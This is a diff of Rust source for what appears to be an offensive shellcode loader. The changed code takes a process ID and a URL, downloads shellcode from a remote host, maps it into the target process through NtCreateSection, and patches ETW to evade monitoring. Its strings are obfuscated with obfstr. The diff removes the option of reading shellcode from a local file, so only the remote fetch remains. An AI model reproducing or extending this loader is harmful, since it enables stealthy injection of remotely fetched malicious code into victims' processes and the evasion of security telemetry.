@@ -118,7 +118,7 @@ unsafe fn create_section(cipher: Vec<u8>) -> (HANDLE, usize, Vec<u8>) {
         HANDLE(null_mut()),
     );
     drop(api);
-    
+
     if status < 0 {
         panic!("{}{}", obfstr!("[-] NtCreateSection failed: "), GetLastError().0);
     }
@@ -271,22 +271,22 @@ fn main() {
 
     unsafe {
         let pid: u32 = env::args().nth(1).expect(obfstr!("Missing PID!")).parse().unwrap();
-        let url_or_file = env::args().nth(2).expect(obfstr!("Missing file or remote url!"));
-        let shellcode: Vec<u8> = Vec::new();
-        let is_http = url_or_file.starts_with("http");
+        let url = env::args().nth(2).expect(obfstr!("Missing file or remote url!"));
+        
+        let is_http = url.starts_with("http");
 
-        if is_http {
+        let mut shellcode: Vec<u8> = if is_http {
             let client = reqwest::blocking::Client::new();
-            let shellcode = client.get(url_or_file)
+            client.get(url)
             .send()
             .unwrap()
             .bytes()
             .unwrap()
-            .to_vec();
-
+            .to_vec()
         } else {
-            let shellcode = std::fs::read(&url_or_file).unwrap();
-        }
+            panic!("");
+        };
+       
     
         patch_etw();
         take_a_nap(500);
